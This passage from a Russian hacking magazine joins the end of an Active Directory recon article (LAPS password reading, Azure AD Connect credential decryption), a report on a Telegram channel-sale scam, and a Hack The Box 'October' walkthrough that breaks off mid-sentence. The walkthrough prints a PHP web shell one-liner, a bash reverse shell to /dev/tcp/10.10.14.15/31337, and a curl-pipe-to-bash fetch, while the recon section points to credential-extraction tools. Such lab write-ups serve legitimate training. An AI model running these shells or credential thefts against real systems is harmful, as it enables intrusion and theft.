Теперь легко получить пароль.



  > Get‐AdmPwdPassword ‐ComputerName wkstn02 | fl
  ComputerName        : WKSTN02
  DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
  Password            : !qP)iyT
  ExpirationTimestamp :



APPLOCKER
AppLocker — технология, которая позволяет системному администратору
блокировать выпол нение определен ных исполняемых файлов на компьюте‐
рах в сети. То есть можно создать правила, по которым будет выдаваться раз‐
решение на выпол нение или отказ. Например, можно проверять уникальные
идентификаторы файлов и раз решать запуск только определенным поль‐
зователям или группам.
  Обычно конфигурация AppLocker применя ется через объ ект групповой
политики. В таком случае легко извлечь конфигурацию из SYSVOL, если у нас
есть доступ на чтение к общему ресурсу. Как просмотреть объ екты групповой
политики и к каким машинам они применя ются, смотри в разделе LAPS. Отли‐
чается только путь:


Software\Policies\Microsoft\Windows\SrpV2\%ext%\
xxxxxxxx‐xxx‐xxx‐xxx‐xxxxxxxxxxxx





             Пример раз реша ющего пра вила AppLocker

Есть три способа применения запрещающего правила: Publisher, Path
и File Hash.





             Пример запрещающего пра вила AppLocker

На месте %ext% исполь зуй ключи: Appx, Exe, Dll, Msi, Script.


AZURE ACTIVE DIRECTORY
Azure Active Directory (Azure AD) — облачная служба управления удос товере‐
ниями и доступом. Она нужна для соз дания учетных записей пользователей
и управления ими и применя ется в облачных сервисах Microsoft, таких
как Azure, Oﬃce 365, SharePoint. Если в AD для аутентификации пользовате‐
лей служит Kerberos, то здесь в той же роли исполь зуется OAuth 2.0.
  Синхронизация AD и Azure AD происходит по трем сценариям.
 1. Сценарий син хро низации катало га. Он поз воляет синхронизировать
   с облаком новые учет ные записи пользователей и групп, при этом логин
   у пользователя син хронизируется с AD, а пароль придется сменить, так
   как он не синхронизируется.
 2. Сценарий син хро низации паролей дает возможность пользователям
   логиниться в облачный сервис с паролем от локальной учетной записи AD.
  При этом синхронизируется логин и хеш пароля.
 3. Сценарий единого вхо да обеспечива ет проверку подлинности поль‐
   зователей в локальном катало ге AD и позволя ет реализовать сце нарий
   единого входа с использованием корпоративных учетных данных — за счет
   синхронизации токенов доступа.

Про атаку на сценарий единого вхо да много рас сказать не могу, и для него
нужны права администратора. Так как пароль в данном случае передается
между Azure AD Connect и Azure ServiceBus в откры том виде, то есть воз‐
можность его перехватить. FileAzureadHookDLL позволяет внедрить DLL
и получить пароль поль зователя во время соединения. В качес тве параметра
данное приложение принимает PID процес са AzureADConnectAuthentica‐
tionAgentService[*].


Сце нарий син хро низации паролей
Для нас особенно интересен сценарий синхронизации паролей (PHS).
Для синхронизации данных в AD есть приложение Azure AD Connect, которое
извлекает данные из AD и переда ет их в AAD. За синхронизацию отве чает
служба DCSync.





                Схема синхро низации AzureAD Connect

При создании соединения на хосте заводится новая база данных, при этом
используется LocalDB для SQL Server. Мы можем просмотреть информацию
о работающем экземпляре с помощью инс трумента SqlLocalDb.exe.





                  Пример работы SqlLocalDb.exe

База данных поддерживает Azure AD Sync — в ней хранятся метаданные
и конфигурации для службы. Зашифрованный пароль находится в таблице
ADSync.dbo.mms_management_agent  в  поле  encrypted_configuration,
и для его расшифровки используется биб лиотека C:\Program  Files\Mi‐
crosoft  Azure  AD  Sync\Binn\mcrypt.dll.  Расшифровывать  можно
при помощи AzureadDecryptorMsol.ps1.





          Пример работы скрипта AzureadDecryptorMsol.ps1

Как видишь из конфигура ции безопасности, если получится скомпромети‐
ровать сервер с Azure AD Connect и получить доступ либо к ADSyncAdmins,
либо к локальным группам администраторов, то открывается возможность
заполучить учетку, которая может выполнять DCSync.





                    Конфигура ции безопас ности


Сце нарий син хро низации катало га
В этом сценарии к одной и той же учетной записи в AD и AAD применя ются
разные пароли, что делает неактуальной атаку на сес сию синхронизации.
Но так как остальные учетные данные в случае синхронизации будут сов‐
падать, мы можем провести разведку для AAD, и ее результаты в большинс‐
тве будут актуальны для AD.
  Для удобства будем использовать Azure CLI, это инструмент для Linux,
который используют в сетях Windows. Начина ем с команды az login — она
сгенерирует локальные токены OAuth, откро ет окно браузера на странице
авторизации, и ты сможешь войти под уже имеющимся пользовате лем. Сле‐
дующая команда позволяет получить спи сок пользователей, параметр out‐
put определяет формат представления данных, а query — какие данные
выводить.


az ad user list ‐‐output=json ‐‐query='[].{UPN:userPrincipalName,
Name:displayName,Email:mail,UserId:mailNickname,Enabled:accoun
tEnabled}'

Вот некоторые другие воз можнос ти.
  Список групп:


az ad group list ‐‐output=json ‐‐query='[].{Group:displayName,Descri
ption:description}'

Список пользователей в определен ной группе:


az ad group member list ‐‐output=json ‐‐query='[].{UPN:userPr
incipalName, Name:displayName, UserId:mailNickname, Enabled:accoun
tEnabled}' ‐‐group='<group name>'

Список приложений:


az ad app list ‐‐output=json ‐‐query='[].{Name:displayName,URL:
homepage}'

Все службы:


az ad sp list ‐‐output=json ‐‐query='[].{Name:displayName,Enabled:
accountEnabled,URL:homepage}'

Информация о конкретной службе:


az ad sp list ‐‐output=json ‐‐display‐name='<display name>'


ЗАКЛЮЧЕНИЕ
Теперь ты знаешь все лазейки и методы, с помощью которых можно получить
информацию для проведения атак на пользователей, повышения привиле гий,
бокового продвижения и захвата сети в целом. Используй эти знания с умом!
ВЗЛОМ





   УДАЛЕННЫЙ
    АККАУНТ?
     НОВЫЙ СПОСОБ ОБМАНУТЬ
     ГАРАНТОВ СДЕЛОК В TELEGRAM




Далеко не каждый  «удаленный  аккаунт»
в Telegram действительно удален. Часто их
используют, чтобы обма нуть либо покупа‐
теля канала, либо продавца. Но иногда
жертвами становятся и сами гаранты сде‐         Андрей Минаев
лок. Это и произошло в начале октября
с гарантом Василием Сусовым, который
занимается  проведением  сделок  более
пяти лет. Как это случилось? Об этом я
и расскажу.


КАК ОБЫЧНО ПРОХОДЯТ СДЕЛКИ
Продажа канала, чата или бота в Telegram — не самый проз рачный процесс.
Пока не появилась возможность переда вать права создателя канала, при‐
ходилось вместе с каналом предос тавлять покупателю и аккаунт создателя.





                   Кноп ка переда чи прав на канал

Для таких сделок прив лекают зарекомендовавших себя гарантов. Они кон‐
тролируют весь процесс и отвечают за то, чтобы продавец получил деньги,
а покупатель — канал. За сделку гаранту полагается вознаграждение.
  Но где деньги, там всегда появляются мошенники. Гаранты регулярно
сталкиваются с разными схемами обмана со сто роны как покупателей, так
и продавцов. Поэтому порядок совершения сделки строго определен и не
меняется.
   Иногда мошен ники предлага ют продавцу провес ти сделку через сторон‐
него гаранта или вовсе без него, что бы не оплачивать его услу ги. Ради эко‐
номии некоторые админы соглашаются, но в итоге остаются и без денег,
и без канала. Если вовремя не опомнятся.


             INFO

                 О других способах мошенничества при продаже
                       каналов в Telegram читай в предыдущей статье
                      Андрея  Минаева   «Осторожно,  мошенники!
                       Как угоняют каналы в Telegram и что с этим
                        делать».



ЧТО ПРОИЗОШЛО?
4 октября в админских чатах ста ла появлять ся информация, что Сусов
при проведении сделки кинул админа Media на 550 тысяч рублей за канал
«Адамово яблоко». Постра давший админ создал отдельный  канал, где
показал переписку с гарантом и описал своими сло вами, что случилось.





                  Пост покупателя о про изо шедшем

Админ потребовал у гаранта вернуть деньги. При этом администраторы
из комьюнити стали серьезно сомневаться в порядочности гаранта. Стоило
начать разбираться, и всплыли интересные детали.
  Например, всех удивило, что предложение о продаже канала было най‐
дено на Avito. Это весьма редкое явление в Telegram, и мало кто с этим стал‐
кивался. Предложения о покуп ке и продаже каналов размещаются на соот‐
ветствующих каналах или через ботов в самом Telegram — на так называемых
биржах.
  Сам канал оказался сомнительной тематики. Он рекламировал ся в постах
с упоминанием порно, проституции, измен. Для 60 тысяч под писчиков сто‐
имость канала в 550 тысяч рублей явно завыше на.





           Типич ный рекламный пост канала «Ада мово яблоко»

Продавца и покупателя админское комь юни ти толком не знало. Media заяв‐
лял, что он новичок в Telegram, — но уже про ворачива ет сделку на пол милли‐
она рублей через непопулярную в этой среде платежную систему Payeer.





             Media утверждает, что впервые покупает канал

Подозрения вызвал и покупатель, когда слишком быстро согласился на ком‐
пенсацию только части «утерянных» денег. Из‐за всего этого админы начали
искать дополнительную информа цию и нашли немало интересного.


ПСЕВДОПОКУПАТЕЛЬ
Покупатель заявлял, что он новичок в Telegram, но при этом он указан
как администратор на крип товалютном канале Crypto post | ICO с количес‐
твом подписчиков более 115 тысяч.





        Покупатель указан в качестве контакта на крупном канале

Выяснилось, что Media когда‐то предлагал нес коль ким админам купить их
каналы. При этом сделку хотел провести через гаранта Сергея Новикова
с явно накрученной бир жи @tradeteleg (сейчас @telegtrade). Адми ны обра‐
тили внимание на резкое увеличение числа подписчиков этой биржи,
за которым последовало такое же рез кое снижение их активности.
   Так как админы не слышали про Сер гея Новико ва, они предлагали про‐
веренных гарантов. В результате Media отказывался от сделки.





    Media предлагает админу провести сделку через накрученную биржу

На той же бирже админы нашли страницу с фейковыми отзывами. Некоторые
даже обнаружили свои отзывы, которые оставляли другим биржам.





          Админ указывает, что отзыв этой бирже не оставлял

Стало ясно, что покупатель и продавец — это один и тот же человек, который
хотел обмануть непосредственно гаранта, а когда не получилось, начал угро‐
жать, что испортит репутацию.


СХЕМА МОШЕННИЧЕСТВА
Сделки с удаленными акка унтами гаранты проводят регулярно. Тут главное —
убедиться, что аккаунт действитель но уда лен, и осо бых проблем не будет.
  В связи с тех нической особенностью Telegram перейти в аккаунт соз‐
дателя из панели администратора канала невозможно. Отображается только
название, аватарка и время последней активности. Поэтому проверить, есть
ли там поле отправки сооб щения, нельзя.





    Отображается время пос ледней активности у поддельного аккаунта

Чтобы исклю чить проверку на время активнос ти, мошенник добавил в черный
список гаранта Василия Сусова. Сделал он это, чтобы отображалась пометка
«был(а) давно» (last seen a long time ago) вмес то «был(а) недавно» (last seen
recently). И для подстраховки он добавил в черный спи сок и его коллегу Ярос‐
лава Муромцева.





  Отображение последней активности, ког да вас добавили в черный спи‐
  сок

Выглядит как обыч ный уда ленный аккаунт. Как только Сусов получил админку
к каналу, подтвердил это и собрался проверить канал по остальным пунктам,
мошенник стал действовать по своему алгоритму.





   Гарант просит подождать с оплатой, пока проверя ет удаленный аккаунт

Мошенник переводит оплату продавцу — то есть самому себе — и скидывает
скрин об этом в общий чат сделки. Затем происходит следующее.
 1. Мошенник удаляет гаранта из администра торов канала, который продает‐
   ся. В администраторах канала оста ются только поддельный «удаленный
   аккаунт создателя» и акка унт продавца.
 2. Мошенник удаляет сооб щения в чате с аккаунта продавца.
 3. Мошенник удаляет сам аккаунт продавца.
 4. После этого в админке остается поддельный «удаленный аккаунт соз‐
   дателя».

В этой схеме продавец, покупа тель и уда лен ный аккаунт создателя — один
человек — мошенник. И тут мы вернулись к началу истории: покупатель обви‐
няет гаранта в том, что потерял день ги и не получил права на канал, и тре бует
с него компенсацию.
  В нормальной сделке, где покупа тель и продавец — реальные люди, а не
мошенники, гарант, проверив удаленный акка унт, обнаружил бы обман (о
том, что и как проверять, — дальше).





  У поддельного удаленного аккаунта не меняется перевод наз вания
  при изменении языка на английский

Эта история закончилась хорошо: схему разоблачили, и мошенник остался
ни с чем. Админы добавили мошенника, поддель ную биржу и его канал в чер‐
ные списки, сервисы аналитики выдали метки мошенника.





                       Мет ка мошенника

Как видишь, работа гаранта нуж на, чтобы обезопа сить две стороны от воз‐
можного обмана. При этом нет полной уверенности, что жертвой обмана
не станет сам гарант.


КАК ПРОВЕРИТЬ, ЧТО АККАУНТ ДЕЙСТВИТЕЛЬНО УДАЛЕН?
Самые оче видные моменты:  отсутс твие  логина, фотографии, описания
и номера телефо на. Название канала должно быть именно «Удалённый акка‐
унт». Иногда мошенники глупят и пишут е вместо ё или «аккаунт» с заглавной
буквы.
   Есть и другие, менее очевидные критерии.
 1. У аккаунта вместо пос леднего времени активнос ти отображается «был(а)
   давно».




               Время активности у уда лен ного аккаунта
 2. Если открыть диалог с уда ленным акка унтом, должно отсутствовать поле
   для отправ ки сооб щения.





                Отсутству ет поле отправки сообщения
 3. На десктопных клиентах в качес тве ава тарки отоб ражается аббре виатура
   УА, а на телефонах привидение.





                     Привидение на аватарке
 4. При изменении языка интерфейса меня ется название аккаунта. Нап‐
   ример, на английском языке удаленный аккаунт будет подписан как Delet‐
   ed Account.





            Название уда ленного аккаунта на английском язы ке

Таким образом, отличить поддельный уда лен ный аккаунт от реально удален‐
ного вполне возможно.


Ком мента рий Василия Сусова
История поучительная. Теперь еще более тща тель но сле жу за тем, что и как
пишу в чат, чтобы у участников сделки не оставалось возможности интерпре‐
тировать мои слова по‐своему.
  Но нужно понимать, что описанный спо соб обмана лишь один из многих,
которыми пользуются мошенники. Дам еще три простых совета, которые
в большинстве случаев оберегут вас от кра жи:
 • Чаще всего мошенники выступают в роли покупателя. Если собираешься
   продавать канал, никогда не сог лашайся на демонстрацию своего экрана
   покупателю через скайп, это просят сделать толь ко мошенники.
 • Когда дело доходит до выбора гаранта, мошенники либо предлагают
   никому не известного гаранта с фей ковыми отзы вами или подставной
   гарант‐сайт, либо дела ют фейковый акка унт сущес твующе го гаранта
   с хорошей репутацией. Всег да проверяй, есть ли реальные гарантии
   и причины доверять, договаривайся о сделке самостоятельно и вни‐
   мательно сверяй контакты.
 • Если ты все же решишься провес ти сдел ку без гаранта, хорошенько озна‐
   комься с тонкостями работы системы безопас ности Telegram.
ВЗЛОМ

В КОРОЛЕВСТВЕ
    PWN





          ОБХОДИМ DEP
        И БРУТФОРСИМ ASLR
     НА ВИРТУАЛКЕ С HACK THE BOX





Сегодня мы захватим виртуальную машину
October с Hack The Box. Нас ждет иссле‐
                                                                                       snovvcrashдование October CMS, получение веб‐шел‐                                                                                        Безопасник, временами
                                                                                        питонщик, местамила, разведка на хосте (поиск уязвимого                                                                                            криптоана(рхист)литик, по
                                                                                   необходимости системныйбинарника) и комбинация атак  ret2libc +                                                                                         администратор
брутфорс  ASLR  для  получения  сессии        snovvcrash@protonmail.ch
суперпользователя.


          PWNВ королевс тве
В этом цикле статей мы изу чаем раз ные аспекты атак типа «переполнение
стека». Читай также:
 • «Препарируем классику переполнения буфера в современных условиях»
 • «ROP‐цепочки и атака Return‐to‐PLT в CTF Bitterman»
 • «Атака ret2bss, криптооракулы и реверс‐инжиниринг на виртуал ке Smasher
   с Hack The Box»



Машину для нового прохождения я выб рал не потому, что на дворе октябрь,
а в основном за специфику испытаний, которая поз волит продол жить тему
низкоуровневой эксплуатации, начатую мной в прошлой статье. October —
относительно несложная вир туальная машина (уровень Medium — 4,7 бал ла
из 10), однако на ее примере удобнее всего разоб рать, что представляет
собой атака ret2libc, с помощью которой обходят зап рет выполнения данных
в сте ке (DEP/NX‐Bit), и как подбира ется адрес той самой стандартной раз‐
деляемой библиотеки libc, что бы обмануть механизм рандомизации раз‐
мещения адресного прос транства (ASLR).
  На общий уровень сложности машины повлияло и то, что в админке CMS,
которую предполагалось захватывать, «случайно» оставили дефолтную авто‐
ризацию. Поэтому быстро пробежим вступление и более под робно оста‐
новимся на этапе эскалации привилегий.


РАЗВЕДКА
Nmap
На этот раз я немного изменю свою стандартную тактику использования
Nmap и попробую новый трюк.



  root@kali:~# nmap ‐n ‐Pn ‐‐min‐rate=1000 ‐T4 ‐p‐ 10.10.10.16 ‐vvv | tee
  ports
  Starting Nmap 7.80 ( https://nmap.org ) at 2019‐09‐23 19:01 EDT
  Initiating SYN Stealth Scan at 19:01
  Scanning 10.10.10.16 [65535 ports]
  Discovered open port 22/tcp on 10.10.10.16
  Discovered open port 80/tcp on 10.10.10.16
  SYN Stealth Scan Timing: About 25.97% done; ETC: 19:03 (0:01:28 remain‐
  ing)
  SYN Stealth Scan Timing: About 60.13% done; ETC: 19:03 (0:00:40 remain‐
  ing)
  Completed SYN Stealth Scan at 19:03, 90.44s elapsed (65535 total ports)
  Nmap scan report for 10.10.10.16
  Host is up, received user‐set (0.081s latency).
  Scanned at 2019‐09‐23 19:01:57 EDT for 90s
  Not shown: 65533 filtered ports
  Reason: 65533 no‐responses
  PORT   STATE SERVICE REASON
  22/tcp open  ssh     syn‐ack ttl 63
  80/tcp open  http    syn‐ack ttl 63


  Read data files from: /usr/bin/../share/nmap
  Nmap done: 1 IP address (1 host up) scanned in 90.52 seconds
  Raw packets sent: 131135 (5.770MB) | Rcvd: 69 (3.036KB)


Первым действием я на высокой ско рости (опции ‐‐min‐rate=1000, ‐T4)
просканирую весь диапа зон портов хоста October. Запросив максимально
подробный фидбэк от Nmap (тройным ‐vvv), я перенаправлю вывод в файл
ports с помощью команды tee, но в то же время смогу видеть промежу точные
результаты и прогресс выполнения до завершения работы сканера.




                                                 [0‐9]'  root@kali:~# ports=$(cat ports | grep '      | awk ‐F "/" '{print $1}' |
  tr "\n" ',' | sed 's/,$//')
  root@kali:~# echo $ports
  22,80


После чего, вооружившись текстовыми процес сорами командной строки Lin‐
ux и мощью регулярных выражений, я вытащу все порты из результата ска‐
нирования, сформирую из них строку, в которой номера портов разделены
запятой, и присвою ее зна чение переменной $ports. Если магия парсинга
файла ports кажется неин туитивной, попробуй по час тям разобрать при‐
веденный одностроч ник, с каждым разом при бавляя следующий конвей ерный
оператор и команду, идущую за ним.



  root@kali:~# nmap ‐n ‐Pn ‐sV ‐sC ‐‐reason ‐oA nmap/october ‐p$ports
  10.10.10.16
  root@kali:~# cat nmap/october.nmap
  # Nmap 7.80 scan initiated Mon Sep 23 19:04:21 2019 as: nmap ‐n ‐Pn ‐sV
  ‐sC ‐‐reason ‐oA nmap/october ‐p22,80 10.10.10.16
  Nmap scan report for 10.10.10.16
  Host is up, received user‐set (0.080s latency).


  PORT   STATE SERVICE REASON         VERSION
  22/tcp open  ssh     syn‐ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (
  Ubuntu Linux; protocol 2.0)
  | ssh‐hostkey:
  |   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
  |   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
  |   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
  |_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
  80/tcp open  http    syn‐ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
  | http‐methods:
  |_  Potentially risky methods: PUT PATCH DELETE
  |_http‐server‐header: Apache/2.4.7 (Ubuntu)
  |_http‐title: October CMS ‐ Vanilla
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


  Service detection performed. Please report any incorrect results at
  https://nmap.org/submit/ .
  # Nmap done at Mon Sep 23 19:04:31 2019 ‐‐ 1 IP address (1 host up)
  scanned in 10.19 seconds


Завершающим действием я вызову Nmap с переменной $ports, где хранится
отсортированный список найденных портов, в качестве значения опции ‐p.
Флаг ‐‐reason служит для того, чтобы сканер мог аргу ментированно «объ‐
яснить», на основании каких данных он сделал тот или иной вывод о статусе
доступности каждого порта. Эти доводы можно наблюдать в появившейся
колонке REASON.
  Судя по баннеру, который «слил» демон SSH, и дате релиза машины
на HTB, это Ubuntu 14.04. Другой очевидной информации нет, поэтому идем
проверять, что творится на вебе.


Веб — порт 80
На http://10.10.10.16:80 тебя встретит сервер Apache с October CMS
(тема — Vanilla).





                     Главная стра ница веб‐сервера

Если поискать информацию о том, как попасть в панель админа, то на первой
же странице мы найдем за ботливый ответ на форуме самой CMS: просто
добавь /backend в адресную строку.





            Доступ к админке October CMS через /backend

Оказавшись в админке, я, недолго думая, попробовал стандартные admin:
admin.





                  Пос ле авторизации в админке

И вот я уже на пороге панели управления. Вопросив searchsploit об известных
уязвимостях October CMS, я нашел спо соб заг рузки веб‐шел ла. В основе
способа — непол ный черный список рас ширений потенциально уяз вимых
файлов, в котором отсутствовало упомина ние о php5.


106: <?php
107: protected function blockedExtensions()
108: {
109:         return [
110:                 // redacted
111:                 'php',
112:                 'php3',
113:                 'php4',
114:                 'phtml',
115:                 // redacted
116:         ];
117: }

На такую возможность намекал и уже лежавший в библиотеке скрипт на PHP
5. Поэто му я нажал Upload и загрузил самый банальный бэкдор, который смог
придумать.



  root@kali:~# echo '<?php system($_REQUEST["cmd"]); ?>' > backdoor.php5





                 Загружен бэкдор с расширени ем .php5

Теперь я могу инициировать выполнение команд от име ни www‐data, обра‐
тившись к загруженному файлу с аргу ментом cmd.





                Триггерим удален ное выполнение команд


Ре верс‑шелл
Раз у меня есть RCE, ничто не помешает мне получить шелл. Сделаю я это из
Burp Suite для нагляднос ти, прописав в качес тве пейлоада реверс‐шелл
на Bash по TCP (мой IP — 10.10.14.15, порт — 31337).



  bash ‐c 'bash ‐i >& /dev/tcp/10.10.14.15/31337 0>&1'





             Инициируем реверс‐шелл с помощью Burp

После отправки запроса можно ловить отклик на netcat.





                  Ловим шелл с помощью netcat

Став обладателем грубого шелла, я апгрейдил его до удобного инте рак‐
тивного PTY‐терминала, как показывал в прохождении Mischief.





               Улучшаю сессию до полноценного PTY‐шелла

Таким образом я оказался внутри машины и начал осматриваться вокруг.





                  Поль зовательский флаг получен


LinEnum
Одним из наиболее удобных инструментов для сбора информации внутри
хоста я считаю LinEnum. Этот написанный на Bash скрипт покажет всю стра‐
тегически важную информа цию о системе в простом текстовом формате.


Пересы лаем фай лы с ком фортом
Для переброса файлов на машину‐жертву удоб но использовать простой
HTTP‐сервер на Python.
  Создай временную папку на своем хос те, ско пируй в нее скрипт и запусти
сервер командой python  ‐m  SimpleHTTPServer  8888  (для Python  2)
или python3 ‐m http.server 8888 (для Python 3). После этого ты сможешь
обратиться к содержимому временной папки с другого хоста в этой сети.
Обрати внимание, что все, кто зна ет нуж ный IP и порт, на котором под нят
сервер, могут получить дос туп к чтению файлов внутри корневой директории,
поэтому рекомендую создавать именно отдельную директорию, в которой
нет чувствительной информации (а Path Traversal питоновский сервер не под‐
вержен).
   Чтобы не оставлять лишних следов на атакуемой машине, скрипт можно
выпол нить без непосредс твенного сохранения на диск — прос то выдерни
его со своего сервера с помощью curl и передай на исполнение интерпре‐
татору через пайп.


 $ curl ‐s http://10.10.14.15:8888/LinEnum.h | bash ‐s ‐‐ ‐t


С помощью флага ‐s и следующего после него разделителя ‐‐ можно
передавать параметры для самого скрипта — в данном случае ‐t оз начает
провести более глубокое ска нирование.
  Некоторые другие быс трые решения для трансфера файлов, обладающие
большими возможностями, я когда‐то рас сматривал у себя в блоге.


Из обширно го вывода LinEnum первое, что бро сается глаза, — это секция
с исполняемыми файлами, для которых установлен бит SUID.





            Файлы SUID на ВМ October (отчет LinEnum)

Внимание привлек нестандартный файл /usr/local/bin/ovrflw, владель‐
цем которого является root. Взглянем на него поближе.


ovrflw





                 Проб ное вза имо действие с ovrﬂw



  www‐data@october:/usr/local/bin$ file ovrflw
  ovrflw: setuid ELF 32‐bit LSB  executable, Intel 80386, version 1 (
  SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24,
  BuildID[sha1]=004cdf754281f7f7a05452ea6eaf1ee9014f07da, not stripped


После поверхностного анализа ока залось, что:
 • это динамически скомпонованный 32‐битный исполняемый файл;
 • он требует стро ку в качестве аргумента;
 • при использовании строки большой длины прог рамма крашится с ошиб‐
   кой сегментирования.

Судя по названию файла, ско рее всего, этот бинарник уязвим к перепол‐
нению буфера.
  Прежде чем отправить ovrflw к себе на машину для пос ледующего ана‐
лиза, выясним, активен ли механизм ASLR на ВМ October. Это можно сделать
любым  из  удобных  спо собов: мож но  проверить  содержимое  файла
/proc/sys/kernel/randomize_va_space либо вос пользоваться скриптом
ldd, который покажет адреса загрузки раз деляемых библиотек, линкованных
с файлом.





         Проверка активнос ти механизма ASLR на ВМ October

Значение 2 говорит, что активен режим полной рандомизации (к слову, 1
символизирует  «умерен ную»  рандомизацию — ASLR  работает  только
для разделяемых библиотек, стека, mmap(), vDSO и позиционно независимых
файлов; 0 — все в ста тике), а команда ldd ovrflw | grep libc, выпол‐
ненная в цикле 20 раз, при каждом запус ке показывает новый адрес загрузки.


             INFO

                    Не рекомендуется использовать ldd для анализа
                       исполняемых файлов, которым ты не доверяешь.
                      Это  следует  из  специфики  работы  скрип та:
                        в  большинстве  случаев  для  извлечения  тре‐
                      буемой  информации  ldd  просто  запускает
                      бинарник  с  предварительно  установленными
                      переменными  окружения,  которые  дают  воз‐
                      можность  отслеживать  загруженные  в  память
                      объекты, взаимодействующие с анализируемым
                    файлом.


Посмотрим информацию о ядре.



  www‐data@october:/usr/local/bin$ uname ‐a
  Linux october 4.4.0‐78‐generic #99~14.04.2‐Ubuntu SMP Thu Apr 27 18:51:
  25 UTC 2017 i686 athlon i686 GNU/Linux


Конфигурация ВМ близ ка к конфигурации стенда, который я использовал
в первой статье из серии об экс плуатации переполнения буфера, поэтому
перетащим исполняемый файл на локальную машину (закодировав его
в Base64, к примеру, и скопировав как текст) и посмотрим, с какими
еще механизмами безопасности нам предсто ит столкнуться.


АНАЛИЗ OVRFLW В ИСКУССТВЕННЫХ УСЛОВИЯХ
Переместившись на Ubuntu 16.04.6 (i686), запус тим программу из отладчика.





                 Проверяем, что защища ет ovrﬂw

Помимо того что в боевых усло виях на машине‐жертве придется обходить
рандомизацию  адресного  пространс тва,  нам  нужно  будет  обмануть
механизм, предотвращающий выполнение данных (DEP, Data Execution Pre‐
vention), об активности которого говорит NX‐Bit.
   Убедиться в этом можно также с помощью ана лиза заголовков ovrflw ути‐
литой readelf с флагом ‐l.





                 Анализ заголовков ELF‐файла ovrﬂw

Сегмент стека содержит только флаги RW (Read‐Write), но не E (Exec).
   Ассемблерный листинг функции main не слишком отличается от тех при‐
меров, которые мы рассматривали при ана лизе классичес кого переполнения
буфера, разве что здесь дополнитель ный код про веря ет, передан ли прог‐
рамме аргумент, и аварийно ее завершает, если этого не произошло.





                 Листинг ассемблера функции main




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
            PWN В КОРОЛЕВСТВЕ
              ОБХОДИМ DEP И БРУТФОРСИМ ASLR
                    НА ВИРТУАЛКЕ С HACK THE BOX





Об ход DEP — ret2libc
Будем последовательны и для начала спра вимся с нейтрализацией NX, вре‐
менно отключив ASLR на локальной машине.



  $ sudo sh ‐c 'echo 0 > /proc/sys/kernel/randomize_va_space'


Убедимся в том, что адрес библиотеки libc.so статичен.





        Проверка активнос ти механизма ASLR на локальной ВМ

Значение памяти загрузки либы неизменно, поэтому можно прис тупать.


             INFO

                  GDB с установленным PEDA позволяет выполнить
                       такую проверку с помощью всего одной команды:
                   aslr.



Те ория
Когда у тебя нет возможнос ти выполнить шелл‐код прямо в стеке, на помощь
приходит атака возврата в стандартную биб лиотеку, или ret2libc. Суть ее
проста: вместо того чтобы подменять адрес возврата адресом внедренного
на стек вредоноса, тебе нужно переза писать сохраненное значение EIP
на адрес функции из арсенала стандартной биб лиотеки языка C, которую ты
хотел бы вызвать. Подскажу: вызвать бы ты хотел, разумеется, функцию sys‐
tem, которая позволяет выполнять команды ОС.

Ору жие. Мно го ору жия
Автор одного из гайдов по переполнению буфера удачно сравнил атаку
ret2libc со сценой выбора оружия из первой час ти кинотрилогии «Матрица»,
когда опе ратор по просьбе Нео заг ружа ет в симулятор комнату с бесконеч‐
ным арсеналом. Разумеется, в нашем случае арсенал конечен (поскольку
конечна библиотека libc), однако метафо ра близка.

       Опе ратор:
     — Итак, что вам нужно? Кроме чуда...
        Нео:
     — Ору жие. Много ору жия.

Ссыл ка на статью: Binary Exploitation ELI5 — Part 1, глава 0x05 — Attack:
ret2libc.


Чтобы лучше понимать концепцию атаки, нарисуем пару картинок. Как меня‐
ется стек во вре мя исполнения эпилога любой функции?





         Изменения стека в ходе исполнения эпилога функции

 1. После выполнения инс трукции leave (которая, как ты помнишь, раз‐
   ворачивается в mov esp,ebp; pop ebp) стек примет состояние, изоб‐
   раженное слева: ESP будет указывать на адрес возврата в вызывающую
  функцию, а значение EBP вос ста новится до зна чения EBP вызывающего.
 2. После выполнения инструкции ret (которая, гру бо говоря, выполняет дей‐
   ствие, похожее на pop eip) стек при мет сос тояние, изображенное спра‐
   ва: ESP  станет  указывать на зна чение, которым заканчивался  стек
   перед выполнением call, стековый фрейм вызываемой функции будет
   окончательно удален, а вызывающий вско ре зай мется очис ткой оставше‐
   гося мусора в виде уже переданных аргу ментов.

Так себя ведет «правильный» эпилог. Чтобы провести атаку ret2libc и добить‐
ся выполнения функции system с пос леду ющим корректным завершением
работы программы, тебе нуж но, чтобы стек принял следующий вид пе ред
тем, как будет достигнут финальный ret уяз вимой функции.





           Запол нение стека при подготовке к атаке ret2libc

 1. Локальные переменные  уязвимой функции дол жны  быть  заполнены
   «мусором», чтобы доб рать ся до адреса возврата.
 2. Адрес возврата (сохраненное зна чение EIP) следует перезаписать адре‐
  сом функции system из биб лиотеки libc.
 3. После этого в стек нужно помес тить значение адре са функции exit (так‐
  же из библиотеки libc) — чтобы прог рамма не крашнулась при завер‐
  шении работы функции system (это опционально, и на это мес то может
   быть передано случайное зна чение, но так акку ратнее).
 4. В  конце  пейлоада  необходимо  раз местить  аргумент  для  функции
  system — обычно это строка "/bin/sh", которая впоследствии прев‐
   ратится в командную оболочку.

Таким образом, перетасовав стек, мы искусственно воссоздали условия
для успешного вызова функции из libc, а именно:
 • притворились вызывающей функцией и разместили в стеке аргумент
   (строку "/bin/sh") для вызываемой функции system;
 • притворились инструкцией call и разместили поддельный «адрес воз‐
   врата» (адрес функции exit);
 • перезаписали оригиналь ное сохраненное зна чение EIP адресом функции
  system.

Оцени элегантность этой методики: находясь в крайней точке стекового кад‐
ра, нарушитель разрабатывает эксплоит, который задом наперед повторя ет
действия компилятора и зас тавляет пос ледний непреднамеренно выпол нить
нужную функцию инструкцией ret, но не call!
  Перейдем  к практике и посмотрим,  как реализовать  эту стратегию
для нашего случая.


Прак тика
Первым делом выясним  размер  буфера,  который, собственно, нужно
